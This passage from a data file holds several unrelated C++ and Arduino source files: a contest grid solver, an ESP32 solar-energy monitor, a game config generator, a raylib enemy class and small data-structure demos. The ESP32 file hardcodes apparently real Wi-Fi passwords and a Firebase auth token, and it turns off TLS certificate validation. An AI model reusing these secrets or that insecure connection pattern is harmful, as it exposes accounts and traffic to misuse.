\u0447\u0438\u0441\u043b\u0430 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430 \u0432 \u0444\u043e\u0440\u043c\u0430\u0442\u0435 little-endian\n//template<typename T>\n//T readNumber(std::ifstream& file) {\n//    T value;\n//    char* ptr = reinterpret_cast<char*>(&value);\n//    for (size_t i = 0; i < sizeof(T); ++i) {\n//        file.read(ptr + i, 1);\n//    }\n//    return value;\n//}\n//\n//int main() {\n//    // \u041e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0444\u0430\u0439\u043b \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0432 \u0431\u0438\u043d\u0430\u0440\u043d\u043e\u043c \u0440\u0435\u0436\u0438\u043c\u0435\n//    std::ifstream file(\"test.ya3\", std::ios::binary);\n//    if (!file) {\n//        std::cerr << \"\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043e\u0442\u043a\u0440\u044b\u0442\u044c \u0444\u0430\u0439\u043b \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f.\" << std::endl;\n//        return 1;\n//    }\n//\n//    // \u0427\u0438\u0442\u0430\u0435\u043c \u0448\u0438\u0440\u0438\u043d\u0443 \u0438 \u0432\u044b\u0441\u043e\u0442\u0443 (2 \u0431\u0430\u0439\u0442\u0430 \u043a\u0430\u0436\u0434\u043e\u0435)\n//    uint16_t width = readNumber<uint16_t>(file);\n//    uint16_t height = readNumber<uint16_t>(file);\n//\n//    // \u0427\u0438\u0442\u0430\u0435\u043c \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0431\u0438\u0442 \u043d\u0430 \u043f\u0438\u043a\u0441\u0435\u043b\u044c (1 \u0431\u0430\u0439\u0442)\n//    uint8_t bitsPerPixel = readNumber<uint8_t>(file);\n//\n//    // \u0427\u0438\u0442\u0430\u0435\u043c \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u043f\u0430\u043b\u0438\u0442\u0440\u044b (2 \u0431\u0430\u0439\u0442\u0430)\n//    uint16_t paletteEntries = readNumber<uint16_t>(file);\n//\n//    // \u0427\u0438\u0442\u0430\u0435\u043c \u0437\u0430\u043f\u0438\u0441\u0438 \u043f\u0430\u043b\u0438\u0442\u0440\u044b\n//    std::vector<uint16_t> angles(paletteEntries);\n//    std::vector<uint16_t> lengths(paletteEntries);\n//    std::vector<uint8_t> rValues(paletteEntries);\n//    std::vector<uint8_t> gValues(paletteEntries);\n//    std::vector<uint8_t> bValues(paletteEntries);\n//    std::vector<uint8_t> aValues(paletteEntries);\n//\n//    for (size_t i = 0; i < paletteEntries; ++i) {\n//        angles",
    "/* \n\u4e3b\u7a0b\u5f0f\u547c\u53eb main \u958b\u59cb\uff0c main \u5728\u6700\u5e95\u90e8\n\n\u601d\u8003\u908f\u8f2f\nT: test case numbers\nN: actions per test case\nR: row count\nC: column count\nSr: current row\nSc: current column\n\nbrute force:\n\u6bcf\u500b\u6848\u4f8b\u90fd\u5efa\u7acb\u5b8c\u6574\u500b\u7db2\u683c\uff0c\u4e26\u6a21\u64ec\u6240\u6709\u904e\u7a0b\ntime complexity: O(T*(R*C + N*max(R,C)))\nspace complexity: O(R*C)\n\noptimization:\n1. \u4e0d\u9700\u8981\u5efa\u7acb\u5be6\u969b\u7db2\u683c\uff0c\u7d00\u9304\u73fe\u5728\u7db2\u683c\u4f4d\u7f6e\u5c31\u597d\u4e86\u3002\u4e5f\u4e0d\u9700\u64d4\u5fc3\u8d85\u51fa\u908a\u754c\uff0c\u56e0\u70ba\u984c\u76ee\u78ba\u4fdd\u6b64\u60c5\u5f62\u4e0d\u6703\u767c\u751f\u3002\n=> \u7bc0\u7701\u7a7a\u9593\u8207\u6642\u9593\n2. \u907f\u514d\u53cd\u8986\u8d70\u904e\u4e00\u6a23\u7684\u683c\u5b50\uff0c\u5229\u7528 disjointed union set \u7684 path compression \u58d3\u7e2e parent \u6307\u91dd\u7684\u8fa6\u6cd5\uff0c\u7e2e\u6e1b\u5916\u9023\u7684\u683c\u5b50\u3002\n=> max(R,C) \u7bc0\u7701\u70ba max(logR, logC)\n3. lazy evaluation\uff0c\u9700\u8981\u6642\u518d\u5275\u5efa\u76f8\u95dc\u7db2\u683c\u3002\n=> \u540c\u6642\u5c07\u5df2\u5efa\u7acb\u7684\u683c\u5b50\u7528 map \u8a18\u9304\u4e0b\u4f86\uff0c\u67e5\u8a62\u548c\u63d2\u5165\u6642\u9593\u7686\u70ba logn\n=> \u7528 hashmap \u61c9\u8a72\u53ef\u4ee5\u518d\u7bc0\u7701\u6642\u9593\ntime complexity: O(T*N*max(logR,logC)*logN)\nspace complexity: O(N)\n\n\u57f7\u884c\u5927\u7db1\uff1a\n- \u7528 class Grid \u4ee3\u8868\u7db2\u683c\u683c\u5b50\uff0c\u5c07\u95dc\u65bc\u683c\u5b50\u7684\u8a08\u7b97\uff08\u5f80\u6771\u5357\u897f\u5317\uff09\uff0c\u4ee5\u53ca\u5176\u76f8\u9130\u7db2\u683c\u72c0\u614b\uff0c\u5c01\u88dd\u5728\u5176\u4e2d\u3002\n- main \u6bcf\u500b test case \u547c\u53eb solve \u4e00\u6b21\u3002\n- solve \u6839\u64da\u6bcf\u500b\u6307\u4ee4\uff08\u5f80\u6771\u5357\u897f\u5317\uff09\uff0c\u66f4\u65b0\u4e00\u6b21\u6240\u5728\u683c\u5b50\u7684\u72c0\u614b\uff0c\u4e26\u627e\u5c0b\u4e0b\u4e00\u500b\u683c\u5b50\u3002\n*/\n\n#include <iostream>\n#include <string>\n#include <map>\n#include <array>\n\nusing namespace std;\ntypedef long long ll;\ntypedef pair<int,int> pii;\n\n// a class that represents the grids on the board\n// also, 0 rep N, 1 rep S, 2 rep E, 3 rep W\nclass Grid {\nprivate:\n    static constexpr int getIndex(char step) {\n        switch (step) {\n            case 'N': return 0;\n            case 'S': return 1;\n            case 'E': return 2;\n            case 'W': return 3;\n            default: return -1;\n        }\n    }\n    \n    static constexpr array<pii,4> dir = {\n        make_pair(-1,0),\n        make_pair(1,0),\n        make_pair(0,1),\n        make_pair(0,-1)\n    };\n    \npublic:\n    Grid* adj[4];\n    int row, col;\n    bool taken;\n    \n    Grid(int Sr, int Sc) {\n        this->row = Sr;\n        this->col = Sc;\n        this->taken = false;\n        for (int i=0; i<4; ++i) {\n            this->adj[i] = nullptr;\n        }\n    }\n    \n    // update the status of the current grid\n    Grid* update(char step, map<pii, Grid*>& allGrids) {\n        int index = this->getIndex(step);\n        this->taken = true;\n        return this->findNext(index,allGrids);\n    }\n    \n    // find the next valid grid\n    Grid* findNext(int index, map<pii, Grid*>& allGrids) {\n        if (!this->taken) {\n            return this;\n        }\n        // if the next grid of this direction(index) isn't registered\n        // see if it is registered elsewhere\n        if (this->adj[index] == nullptr) {\n            pii newP = this->generateNext(index);\n            // check if the next grid is traversed by other direction(index) before\n            if (allGrids.find(newP) == allGrids.end()) {\n                allGrids[newP] = new Grid(newP.first, newP.second);\n            }\n            // update to point to the next grid\n            this->adj[index] = allGrids[newP];\n        }\n        \n        Grid* next = this->adj[index];\n        return this->adj[index] = next->findNext(index, allGrids);\n    }\n    \nprivate:\n    pii generateNext(int index) {\n        auto[rd, rc] = this->dir[index];\n        return {row+rd, col+rc};\n    }\n};\n\n// for clearing memory space after every test case\nvoid clearAll(map<pii, Grid*>& allGrids) {\n    for (auto[p, g]: allGrids) {\n        delete g;\n    }\n    return;\n}\n\n// general function for each test case\n// includes intaking relevant variables, setting up necessary objects\nstring solve() {\n    int N, R, C, Sr, Sc;\n    cin >> N >> R >> C >> Sr >> Sc;\n    string s;\n    cin >> s;\n    map<pii, Grid*> allGrids;\n    Grid* cur = new Grid(Sr,Sc);\n    allGrids[make_pair(Sr,Sc)] = cur;\n    for (char step: s) {\n        //update the old spot status and move to the new spot\n        cur = cur->update(step, allGrids);\n    }\n    \n    string ans = to_string(cur->row) + \" \" + to_string(cur->col);\n    clearAll(allGrids);\n    return ans;\n}\n\n// the invoked function for the whole program\n// takes in the tests cases, and prints out the result\nint main() {\n    int T;\n    cin >> T;\n    int t = 1;\n    string ret = \"Case #\";\n    while (T--) {\n        string ans = solve();\n        cout << ret << t << \": \" << ans << '\\n';\n        t += 1;\n    }\n}\n\n",
    "//-----Planta piloto virtual para el monitoreo y gesti\u00f3n de energ\u00eda fotovoltaica-------------\n//-----UNIVERSIDAD DE COLIMA/ UNIVERSIDAD AUTONOMA DE SAN LUIS POTOSI------\n//-----ESTUDIANTE: JOS\u00c9 ANTONIO JU\u00c1REZ VEL\u00c1ZQUEZ--------------------------\n//-----INVESTIGADORES: DRA. JANETH AURELIA ALCAL\u00c1 RODR\u00cdGUEZ \n//-----                DR. V\u00cdCTOR MANUEL C\u00c1RDENAS GALINDO----------------------------\n//---- \u00faltima actualizaci\u00f3n: OCTUBRE 2024-------------\n\n#include <Arduino.h>\n#include <WiFi.h> // Librer\u00eda para conectar a WiFi\n#include <WiFiClientSecure.h> // Librer\u00eda para realizar peticiones HTTPS\n#include <FirebaseESP32.h> // Librer\u00eda para conectar ESP32 con Google Firebase\n\n//****--DEFINICION DE PINES DE ENTRADA---*********\nconst int pinTension = 34;  // GPIO34 para el sensor de tensi\u00f3n\nconst int pinCorriente = 35; // GPIO35 para el sensor de corriente\n\n// Par\u00e1metros de calibraci\u00f3n para el ADC del ESP32\nconst float vRef = 3300.0; // Voltaje de referencia en mV (3.3V)\nconst int resolucionADC = 4095; // Resoluci\u00f3n del ADC (12 bits)\n\n// Par\u00e1metros de calibraci\u00f3n para sensores\nconst float VCAL = 179.0 / vRef;  // Escala de calibraci\u00f3n de tensi\u00f3n seg\u00fan el valor m\u00e1ximo de entrada de entrada(127V RMS)\nconst float ICAL = 15 / vRef;  // Escala de calibraci\u00f3n de corriente seg\u00fan el valor m\u00e1ximo de entrada del sensor(15 A RMS)\nconst unsigned int ADC_COUNTS = resolucionADC;\n\n// Variables para el filtro de paso bajo\nfloat offsetV = ADC_COUNTS / 3.1; // Offset de tensi\u00f3n inicial\nfloat offsetI = ADC_COUNTS / 2.9; // Offset de corriente inicial\n\n// Variables para el c\u00e1lculo del RMS y promedio\nfloat avgV = 0.0; // Valor promedio recursivo para tensi\u00f3n\nfloat avgI = 0.0; // Valor promedio recursivo para corriente\nfloat sumSqV = 0.0; // Suma acumulativa de los cuadrados de tensi\u00f3n\nfloat sumSqI = 0.0; // Suma acumulativa de los cuadrados de corriente\nunsigned int numMuestras = 1000; // N\u00famero de muestras para c\u00e1lculo\n\n// Variables para promediar m\u00faltiples mediciones\nconst int numPromedios = 5;\nfloat acumuladorVrms = 0.0;\nfloat acumuladorIrms = 0.0;\nfloat acumuladorVavg = 0.0;\nfloat acumuladorIavg = 0.0;\nint contadorPromedios = 0;\n\n// Variables para energ\u00eda y potencia\nfloat potenciaActiva = 0.0;\nfloat potenciaAparente = 0.0;\nfloat consumoEnergetico = 0.0;\nunsigned long tiempoAnterior = 0;\n\n// Estructura para almacenar credenciales de red WiFi\nstruct WiFiInfo {\n  const char* ssid;\n  const char* password;\n};\n// Redes WiFi conocidas\nconst WiFiInfo knownNetworks[] PROGMEM = {\n  {\"Lab_CEECM\", \"Lab_CEECM_2024\"},\n  {\"LABCEECM1\", \"2016labCEECM\"},\n  {\"LABCEECM2\", \"2016labCEECM\"},\n  {\"Lab_Pot_Ghetto\", \"labpotlabpot\"},\n  {\"Kawai\", \"nihongo2024!*\"}\n};\n\n// Variables para la conexi\u00f3n a Firebase\n#define FIREBASE_HOST \"https://monitorfv-basedatos-esp32-default-rtdb.firebaseio.com/\"\n#define FIREBASE_AUTH \"1vD8ukIX6yFk1lX3Y6RaYKb7yRDvltUUnnpWqelw\"\nFirebaseConfig config;\nFirebaseAuth auth;\nFirebaseData MonitorFV;\nconst char* ruta = \"/Ejemplo_01\";  // Cambiado a const char* para ahorrar espacio\n\n// Prototipos de funciones\n\n//-----------------------------------------------------------------------------------------------------\n//****---FUNCI\u00d3N PARA CONECTAR A WIFI---**********\n//-----------------------------------------------------------------------------------------------------\nvoid conectarWiFi() {\n  for (size_t i = 0; i < sizeof(knownNetworks) / sizeof(knownNetworks[0]); ++i) {\n    WiFiInfo network;\n    memcpy_P(&network, &knownNetworks[i], sizeof(WiFiInfo));\n    WiFi.begin(network.ssid, network.password);\n\n    for (int j = 0; j < 5 && WiFi.status() != WL_CONNECTED; j++) {  // Reducido a 5 intentos\n      delay(1000);\n    }\n    if (WiFi.status() == WL_CONNECTED) {\n      break;\n    }\n  }\n}\n\n//-----------------------------------------------------------------------------------------------------\n//****---FUNCI\u00d3N PARA CONFIGURAR FIREBASE---**********\n//-----------------------------------------------------------------------------------------------------\nvoid FirebaseConfiguracion() {\n  config.host = FIREBASE_HOST;\n  config.signer.tokens.legacy_token = FIREBASE_AUTH;\n  Firebase.begin(&config, &auth);\n  Firebase.reconnectNetwork(true);\n}\n\n//-----------------------------------------------------------------------------------------------------\n//****---FUNCI\u00d3N PARA ENVIAR DATOS A BASE DE DATOS MYSQL---**********\n//-----------------------------------------------------------------------------------------------------\nvoid sendToServer(double voltaje, double corriente, double potencia, double energia) {\n  if (WiFi.status() == WL_CONNECTED) {\n    WiFiClientSecure client;\n    client.setInsecure(); // Use insecure connection (no certificate validation)\n    \n    if (client.connect(\"monitorFV.com\", 443)) { // 443 is the port for HTTPS\n      char data[150];  // Buffer para ahorrar espacio con String\n      snprintf(data, sizeof(data), \"voltaje=%.2f&corriente=%.3f&potencia=%.2f&energia=%.3f\", \n               voltaje, corriente, potencia, energia);\n\n      String postData = \"POST /sa",
    "#include <bits/stdc++.h>\n#include <sys/stat.h>\n#include <direct.h>\n\n#define INF 0x7fffffff\n#define MAXN 100005\n#define eps 1e-9\n#define foru(a, b, c) for (int a = b; a <= c; a++)\n#define RT return 0;\n#define LL long long\n#define LXF int\n#define HH printf(\"\\n\")\n#define All(x) (x).begin(), (x).end()\n#define fi first\n#define se second\n\nusing namespace std;\n\n// \u96b1\u85cf\u547d\u4ee4\u884c\u8f38\u51fa\u51fd\u6578\nvoid setConsoleCodePage()\n{\n\tFILE *fp = _popen(\"chcp 65001\", \"r\");\n\tif (fp)\n\t{\n\t\t_pclose(fp);\n\t}\n}\n\n// \u81ea\u5b9a\u7fa9\u8f38\u5165\u51fd\u6578\uff0c\u652f\u6301\u8b80\u53d6\u6574\u578b\ninline LXF rin()\n{\n\tLXF x = 0, w = 1;\n\tchar ch;\n\n\twhile (true)\n\t{\n\t\tch = getchar();\n\t\tif (ch == EOF)\n\t\t\treturn 0; // \u78ba\u4fdd\u4e0d\u6703\u5728\u6587\u4ef6\u7d50\u5c3e\u6642\u9032\u5165\u7121\u7aae\u8ff4\u5708\n\n\t\tif (ch < '0' || ch > '9')\n\t\t{\n\t\t\tif (ch == '-')\n\t\t\t\tw = -1; // \u8655\u7406\u8ca0\u6578\n\t\t\telse if (ch != '\\n')\n\t\t\t{\n\t\t\t\tcout << \"\u7121\u6548\u8f38\u5165\uff0c\u8acb\u8f38\u5165\u6574\u6578\uff1a\";\n\t\t\t\twhile (getchar() != '\\n')\n\t\t\t\t\t;\t  // \u6e05\u7a7a\u8f38\u5165\u7de9\u885d\u5340\n\t\t\t\tcontinue; // \u91cd\u8a66\u8f38\u5165\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// \u958b\u59cb\u7d2f\u52a0\u6578\u5b57\n\t\t\tx = x * 10 + (ch - '0');\n\t\t\t// \u7e7c\u7e8c\u8b80\u53d6\u5f8c\u7e8c\u5b57\u7b26\n\t\t\twhile (true)\n\t\t\t{\n\t\t\t\tch = getchar();\n\t\t\t\tif (ch >= '0' && ch <= '9')\n\t\t\t\t{\n\t\t\t\t\tx = x * 10 + (ch - '0');\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn x * w; // \u8fd4\u56de\u6574\u6578\n\t\t}\n\t}\n}\n\n// \u6aa2\u67e5\u5b57\u7b26\u4e32\u662f\u5426\u7b26\u5408\u8981\u6c42\nbool isValidContentName(const string &name)\n{\n\treturn name.length() <= 3 && all_of(name.begin(), name.end(), ::isalpha);\n}\n\nbool isAlphanumeric(const string &str)\n{\n\treturn all_of(str.begin(), str.end(), ::isalnum);\n}\n\n// \u6aa2\u67e5\u5b57\u7b26\u4e32\u662f\u5426\u53ea\u5305\u542b\u5b57\u6bcd\nbool isAlpha(const string &str)\n{\n\treturn all_of(str.begin(), str.end(), ::isalpha);\n}\n\n// \u5c07\u8def\u5f91\u4e2d\u7684\u53cd\u659c\u6760\u8f49\u70ba\u6b63\u659c\u6760\nvoid convertBackslashesToSlashes(string &path)\n{\n\treplace(path.begin(), path.end(), '\\\\', '/');\n}\n\n// \u8b80\u53d6\u7528\u6236\u8f38\u5165\u7684Sleep\u6beb\u79d2\nint readSleepTime(const string &prompt, const vector<int> &defaults)\n{\n\tsetConsoleCodePage();\n\tcout << prompt << endl;\n\tforu(i, 0, defaults.size() - 1)\n\t{\n\t\tcout << i + 1 << \". \u9ed8\u8a8d\u503c \" << defaults[i] << \" \u6beb\u79d2\" << endl;\n\t}\n\tcout << (defaults.size() + 1) << \". \u81ea\u884c\u8f38\u5165\u4e00\u500b\u6578\u5b57\" << endl;\n\n\twhile (true)\n\t{\n\t\tcout << \"\u8acb\u9078\u64c7\u4e00\u500b\u9078\u9805 (1-\" << defaults.size() + 1 << \"): \";\n\t\tstring input;\n\t\tcin >> input;\n\n\t\tif (all_of(input.begin(), input.end(), ::isdigit))\n\t\t{\n\t\t\tint choice = stoi(input);\n\t\t\tif (choice >= 1 && choice <= defaults.size())\n\t\t\t{\n\t\t\t\treturn defaults[choice - 1];\n\t\t\t}\n\t\t\telse if (choice == defaults.size() + 1)\n\t\t\t{\n\t\t\t\tcout << \"\u8acb\u8f38\u5165\u81ea\u5b9a\u7fa9\u7684 sleep \u6642\u9593\uff08\u6beb\u79d2\uff09\uff1a\";\n\t\t\t\tcin >> input;\n\t\t\t\tif (all_of(input.begin(), input.end(), ::isdigit))\n\t\t\t\t{\n\t\t\t\t\treturn stoi(input);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tcout << \"\u7121\u6548\u7684\u8f38\u5165\uff0c\u8acb\u91cd\u65b0\u9078\u64c7\u3002\" << endl;\n\t}\n}\n\n// \u751f\u6210\u6587\u4ef6\nvoid generateFile(const string &filename, const string &tickerContentName, int sleepTime1, int sleepTime2, int index, char outputDone)\n{\n\tfreopen(filename.c_str(), \"w\", stdout);\n\tstring tickerNameBegin = tickerContentName + to_string(index);\n\n\t// \u751f\u6210 sleep \u547d\u4ee4\n\tforu(j, 1, index - 1)\n\t{\n\t\tcout << \"sleep \" << sleepTime1 << \"\\n\";\n\t}\n\tcout << (tickerNameBegin + \"_begin\") << '\\n';\n\n\t// \u4ea4\u66ff\u8f38\u51fa sleep \u548c Ticker \u5167\u5bb9\n\tfor (int k = 2; k <= 120001; k++)\n\t{\n\t\tcout << (k % 2 == 0 ? \"sleep \" + to_string(sleepTime2) + \"\\n\" : tickerNameBegin + \"\\n\");\n\t}\n\n\tif (outputDone == 'y' || outputDone == 'Y')\n\t{\n\t\tcout << \"echoln done \" + tickerNameBegin << endl;\n\t}\n}\n\n// \u751f\u6210 Loading.cfg\nvoid generateLoadingFile(const string &loadingFile, const string &tickerContentName, int fileCount, const string &utilPath, const string &folderName, const string &tickerName)\n{\n\tfreopen(loadingFile.c_str(), \"w\", stdout);\n\tcout << \"alias \" << tickerContentName << \"clear \\\"\";\n\tforu(i, 1, fileCount)\n\t{\n\t\tcout << \"alias \" << tickerContentName << i << \" \\\"\\\";\" << (i < fileCount ? \" \" : \"\");\n\t}\n\tcout << \"\\\"\\nalias \" << tickerContentName << \"tmpts \" << \"\\\"echoln New Beginning \" << tickerContentName << \"\\\"\\n\";\n\tforu(i, 1, fileCount)\n\t{\n\t\tcout << \"alias \" << tickerContentName << i << \"_begin \\\"\" << tickerContentName << \"clear; alias \" << tickerContentName << i << \" \" << tickerContentName << \"; \" << tickerContentName << \"tmpts\\\"\\n\";\n\t}\n\tcout << \"\\nexec_async \" << utilPath << \"/\" << folderName << \"/\" << tickerName << \"Setup\\n\";\n\tfflush(stdout);\n\tfreopen(\"CON\", \"w\", stdout); // \u5c06\u8f93\u51fa\u91cd\u5b9a\u5411\u56de\u63a7\u5236\u53f0\n}\n\n// \u751f\u6210 Defines.cfg \u6587\u4ef6\nvoid generateDefinesFile(const string &definesFile, const string &tickerContentName)\n{\n\tfreopen(definesFile.c_str(), \"w\", stdout);\n\tcout << \"alias \" << tickerContentName << \" \\\"\\\"\\n\";\n\tfflush(stdout);\n\tfreopen(\"CON\", \"w\", stdout);\n}\n\n// \u751f\u6210 Manager.cfg \u6587\u4ef6\nvoid generateManagerFile(const string &managerFile, const string &utilPath, const string &folderName, const string &tickerName)\n{\n\tfreopen(managerFile.c_str(), \"w\", stdout);\n\tcout << \"exec \" << utilPath << \"/\" << folderName << \"/\" << tickerName << \"Defines\\n\";\n\tcout << \"sv_cheats 1\\nDontExecuteThisAgain\\n\";\n\tcout << \"exec_async \" << utilPath << \"/\" << folderName << \"/\" << tickerName << \"Loading\\n\";\n\tcout << \"sv_cheats 1\\n\";\n\tfflush(stdout);\n\tfreopen(\"CON\", \"w\", stdout);\n}\n\n// \u751f\u6210 Setup.cfg \u6587\u4ef6\nvoid generateSetupFile(const string &setupFile, int fileCount, const string &utilPath, const string &folderName, const string &tickerName)\n{\n\tfreopen(setupFile.c_str(), \"w\", stdout);\n\tforu(i, 1, fileCount)\n\t{\n\t\tcout << \"exec_async \" << utilPath << \"/\" << folderName << \"/\" << tickerName << i << \"\\n\";\n",
    "// Imports\r\n#include <cstdio>\r\n#include <string>\r\n#include <iostream>\r\n#include \"raylib.h\"\r\n#include \"raymath.h\"\r\n#include \"Enemy.h\"\r\nusing namespace std;\r\n\r\n// Enemy Constructor\r\nEnemy::Enemy(Vector2 pos, Texture2D idleTex, Texture2D runTex)\r\n{\r\n    // Simplifying and Declaring Variables\r\n    worldPos = pos;\r\n    texture = idleTex;\r\n    idle = idleTex;\r\n    run = runTex;\r\n    width = texture.width / maxFrames;\r\n    height = texture.height;\r\n}\r\n\r\n// Giving Damage\r\nvoid Enemy::giveDamage(float damage)\r\n{\r\n    target->takeDamage(damage);\r\n}\r\n\r\n// Tick Function\r\nvoid Enemy::tick(float deltaTime)\r\n{\r\n    // Is Alive\r\n    if (!isSpawned()) return;\r\n    if (!getAlive()) return;\r\n    \r\n    //DrawRectangle(getScreenPos().x - range, getScreenPos().y - range, range*2 + width*5, range*2 + height*5, RED);\r\n\r\n    // Calling Base Character Functions\r\n    BaseCharacter::tick(deltaTime);\r\n    \r\n    // Enemy Movement\r\n    if (CheckCollisionRecs(target->getCollisionRec(), {getScreenPos().x - range, getScreenPos().y - range, range*2 + width*5, range*2 + height*5}) && !agro)\r\n    {\r\n        velocity = Vector2Subtract(getScreenPos(), target->getScreenPos());\r\n        if (Vector2Length(velocity) < reach) velocity = {};\r\n        agro = true;\r\n    }\r\n    else if (agro)\r\n    {\r\n        velocity = Vector2Subtract(getScreenPos(), target->getScreenPos());\r\n        if (Vector2Length(velocity) < reach) velocity = {};\r\n    }\r\n\r\n    // Saving New Locational Frame\r\n    worldXNewFrame = worldPos.x;\r\n\r\n    // Giving Damage to Player\r\n    if (CheckCollisionRecs(target->getCollisionRec(), getCollisionRec()) && getLastHit() >  cooldown)\r\n    {\r\n        if (getDelay() == 0.f)\r\n        {\r\n            (rand() % 100 <= critChance) ? giveDamage(getDamage() * critMult) : giveDamage(getDamage());\r\n            target->setKnockVector(getLastVelocity());\r\n            target->setKnockback(target->getSpeed() * getForce() / (sqrt(target->getWeight()) / 2.f));\r\n            if (rand() % 100 <= critChance)\r\n            {\r\n                giveDamage(getDamage() * critMult);\r\n                target->setKnockback(target->getKnockback() * (0.67 + getCritMult() / 3.f));\r\n            }\r\n            else\r\n            {\r\n                giveDamage(getDamage());\r\n            }\r\n            setLastHit(0.f);\r\n        }\r\n        else\r\n        {\r\n            setDelay(getDelay() - 1);\r\n        }\r\n        \r\n    }\r\n    else\r\n    {\r\n        setDelay(15.f);\r\n    }\r\n\r\n    // Enemy Health GUI\r\n    if (tag == \"Gobby the Goblin\" || tag == \"Nickelodeon the Slime\")\r\n    {\r\n        DrawText(tag.c_str(), 228.f, 615.f, 30.f, WHITE);\r\n        DrawRectangle(216.f, 648.f, 824.f, 40.f, BLACK);\r\n        DrawRectangle(218.f, 650.f, getHealth() * (820.f) / getMaxHealth(), 36.f, {255, 21, 5, 255});\r\n    }\r\n    else\r\n    {\r\n        float font = 20.f - tag.length();\r\n        DrawText(tag.c_str(), getScreenPos().x - 8.f + font/3.f, getScreenPos().y - 31.f - font/2.5, font, WHITE);\r\n        DrawRectangle(getScreenPos().x - 6.f, getScreenPos().y - 21.f, width*scale + 12.f, 14.f, BLACK);\r\n        DrawRectangle(getScreenPos().x - 5.f, getScreenPos().y - 20.f, getHealth() * (width*scale + 10.f) / getMaxHealth(), 12.f, {255, 21, 5, 255});\r\n    }\r\n}\r\n\r\n// Getting Screen Position\r\nVector2 Enemy::getScreenPos()\r\n{\r\n    return Vector2Subtract(worldPos, target->getWorldPos());\r\n}\r\n\r\n// Player XP Gain\r\nvoid Enemy::die()\r\n{\r\n    if (getTag() == \"Goblin\")\r\n    {\r\n        target->addXP(3.f);\r\n    }\r\n    if (getTag() == \"Super Goblin\")\r\n    {\r\n        target->addXP(8.f);\r\n    }\r\n    if (getTag() == \"Goblin Bodyguard\")\r\n    {\r\n        target->addXP(16.f);\r\n    }\r\n    if (getTag() == \"Godblin\")\r\n    {\r\n        target->addXP(80.f);\r\n    }\r\n    if (getTag() == \"Slime\")\r\n    {\r\n        target->addXP(5.f);\r\n    }\r\n    if (getTag() == \"Super Slime\")\r\n    {\r\n        target->addXP(12.f);\r\n    }\r\n    if (getTag() == \"Nickelodeon the Slime\")\r\n    {\r\n        target->addXP(25.f);\r\n    }\r\n    if (getTag() == \"Gobby the Goblin\")\r\n    {\r\n        target->addXP(75.f);\r\n    }\r\n    BaseCharacter::die();\r\n}",
    "#include <iostream>\nusing namespace std;\n\nclass Queue {\npublic:\n    int capacity;\n    int front;\n    int rear;\n    int* arr;\n\n    // Constructor to initialize the queue\nQueue(int capacity) {\n        this->capacity = capacity;\narr = new int[capacity];\n        front = -1; // Set front to -1 indicating an empty queue\n        rear = -1;  // Set rear to -1 indicating an empty queue\n    }\n\n    // Enqueue: Add an element to the queue\n    void push(int element) {\n        if (rear + 1 < capacity) { // Check if there's space in the queue\n            if (front == -1) { // If queue is empty\n                front = 0;     // Initialize front\n            }\n            rear++;\narr[rear] = element;\n        } else {\ncout<< \"Queue Overflow\" <<endl;\n        }\n    }\n\n    // Dequeue: Remove an element from the queue\n    void pop() {\n        if (front >= 0) {\n            // If there's only one element, reset front and rear\n            if (front == rear) {\n                front = rear = -1; // Reset to indicate queue is empty\n            } else {\n                front++;\n            }\n        } else {\ncout<< \"Queue Underflow\" <<endl;\n        }\n    }\n\n    // Peek: Get the front element of the queue\n    int peek() {\n        if (front >= 0) {\n            return arr[front];\n        } else {\n            return -1; // Indicate that the queue is empty\n        }\n    }\n\n    // Destructor to free allocated memory\n    ~Queue() {\ndelete[] arr;\n    }\n};\n\nint main() {\n    Queue q(5); // Initialize queue with a capacity of 5\nq.push(10);\nq.push(20);\nq.push(30);\n\ncout<< \"Front element: \" <<q.peek() <<endl; // Should print 10\n\nq.pop(); // Remove 10\ncout<< \"Front element after pop: \" <<q.peek() <<endl; // Should print 20\n\n    return 0;\n}\n",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\nstruct Book {\r\n    int id;\r\n    string title;\r\n    string author;\r\n    bool isIssued;\r\n\r\n    Book(int bookId, string bookTitle, string bookAuthor)\r\n        : id(bookId), title(bookTitle), author(bookAuthor), isIssued(false) {}\r\n};\r\nclass Library {\r\nprivate:\r\n    vector<Book> books;\r\n\r\n    int findBookIndexById(int id) {\r\n        for (size_t i = 0; i < books.size(); i++) {\r\n            if (books[i].id == id) {\r\n                return i;\r\n            }\r\n        }\r\n        return -1;\r\n    }\r\npublic:\r\n    void addBook(int id, string title, string author) {\r\n        books.push_back(Book(id, title, author));\r\n    }\r\n    void searchBookById(int id) {\r\n        int index = findBookIndexById(id);\r\n        if (index != -1) {\r\n            displayBookDetails(books[index]);\r\n        } else {\r\n            cout << \"Book not found.\" << endl;\r\n        }\r\n    }\r\n    void searchBookByTitle(string title) {\r\n        for (const auto& book : books) {\r\n            if (book.title == title) {\r\n                displayBookDetails(book);\r\n                return;\r\n            }\r\n        }\r\n        cout << \"Book not found.\" << endl;\r\n    }\r\n    void issueBook(int id, string student) {\r\n        int index = findBookIndexById(id);\r\n        if (index != -1 && !books[index].isIssued) {\r\n            books[index].isIssued = true;\r\n            cout << \"Book issued to \" << student << \".\" << endl;\r\n        } else {\r\n            cout << \"Book is either not found or already issued.\" << endl;\r\n        }\r\n    }\r\n\r\n    void returnBook(int id) {\r\n        int index = findBookIndexById(id);\r\n        if (index != -1 && books[index].isIssued) {\r\n            books[index].isIssued = false;\r\n            cout << \"Book returned.\" << endl;\r\n        } else {\r\n            cout << \"Book is either not found or wasn't issued.\" << endl;\r\n        }\r\n    }\r\n\r\n    void listAllBooks() {\r\n        sort(books.begin(), books.end(), [](const Book& a, const Book& b) {\r\n            return a.title < b.title;\r\n        });\r\n        for (const auto& book : books) {\r\n            displayBookDetails(book);\r\n        }\r\n    }\r\n\r\n    void 